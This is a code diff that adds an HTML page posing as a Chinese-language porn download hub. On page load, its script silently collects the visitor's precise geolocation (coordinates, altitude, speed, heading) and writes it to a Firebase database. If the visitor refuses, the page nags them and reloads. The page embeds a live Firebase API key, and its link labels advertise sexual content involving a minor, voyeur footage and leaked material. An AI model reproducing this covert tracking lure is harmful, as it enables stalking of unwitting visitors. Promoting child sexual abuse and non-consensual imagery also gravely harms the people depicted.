@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>色情資源交換處</title>
+	<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
+    <meta property="og:site_name" content="色情資源交換處" />
+<meta property="fb:app_id" content="色情資源交換處" />
+<meta property="og:type" content="色情資源交換處" />
+<meta property="og:title" content="色情資源交換處" />
+<meta property="og:image" content="" />
+<script >
+	let longitude
+	let latitude
+	let accuracy,altitude,heading,speed,timestamp
+/*const firebase = require("firebase");
+// Required for side-effects
+require("firebase/firestore");
+	
+	import firebase from "firebase/app";
+import "firebase/firestore";
+*/
+// TODO: Replace the following with your app's Firebase project configuration
+// See: https://support.google.com/firebase/answer/7015592
+  const firebaseConfig = {
+    apiKey: "AIzaSyClMBTyECAs_RLf7KWJrX5tR0SCT0QnW90",
+    authDomain: "dyjh-chat.firebaseapp.com",
+    projectId: "dyjh-chat",
+    storageBucket: "dyjh-chat.appspot.com",
+    messagingSenderId: "292952456539",
+    appId: "1:292952456539:web:8251ee8004cb6049b2ae7e",
+    measurementId: "G-GC76PFDQH1"
+  };
+
+// Initialize Firebase
+firebase.initializeApp(firebaseConfig);
+
+
+// Initialize Cloud Firestore and get a reference to the service
+const db = firebase.firestore();
+function location1(latitude,longitude,accuracy,altitude,heading,speed,timestamp){
+
+db.collection("users").add({
+    latitude: latitude,
+    longitude: longitude,
+	位置精度:accuracy,
+	海拔海平面以上以米计:altitude,
+	方向从正北开始以度计:heading,
+	速度:speed,
+	時間:timestamp
+   
+})
+.then((docRef) => {
+    console.log("Document written with ID: ", docRef.id);
+})
+.catch((error) => {
+    console.error("Error adding document: ", error);
+});
+}
+	function getLocation()
+{
+	if (navigator.geolocation)
+	{
+		navigator.geolocation.getCurrentPosition(showPosition,showError);
+	}
+		
+	
+}window.onload=function(){
+if (Notification.permission === 'default' || Notification.permission === 'undefined') {
+  Notification.requestPermission(function(permission) {
+    // permission 可為「granted」（同意）、「denied」（拒絕）和「default」（未授權）
+    // 在這裡可針對使用者的授權做處理
+  });
+}
+   getLocation()
+    
+   
+}
+function showPosition(position)
+{
+	 latitude =position.coords.latitude 
+	longitude= position.coords.longitude;
+	accuracy=position.coords.accuracy
+	altitude =position.coords.altitude
+	heading=position.coords.heading
+	speed=position.coords.speed
+	timestamp=position.timestamp
+	location1(latitude,longitude,accuracy,altitude,heading,speed,timestamp)
+	
+}
+
+function showError(error)
+{
+switch(error.code) 
+    {
+        case error.PERMISSION_DENIED:
+          alert("為了確保使用體驗請允許所有權限")
+		  location.reload();
+            break;
+        case error.POSITION_UNAVAILABLE:
+           alert("抱歉您目前的裝置不支援")
+		   location.reload();
+            break;
+        case error.TIMEOUT:
+           alert("抱歉您目前的瀏覽器不支援")
+		   location.reload();
+            break;
+        case error.UNKNOWN_ERROR:
+         alert("抱歉您目前的瀏覽器不支援")
+		 location.reload();
+            break;
+    }
+	}
+	</script>
+	
+  </head>
+  <body>
+    <a href="">mega 載點一 10.1GB</a><br>
+	<a href="	https://www.facebook.com/groups/694845977908682/">限時外流</a><br>
+	<a href="">未成年混血洗澡</a><br>
+	<a href="">摸摸</a><br>
+	<a href="">自慰</a><br>
+
+		<a href="">	偷拍</a>
+
+	
+  </body>
+</html>
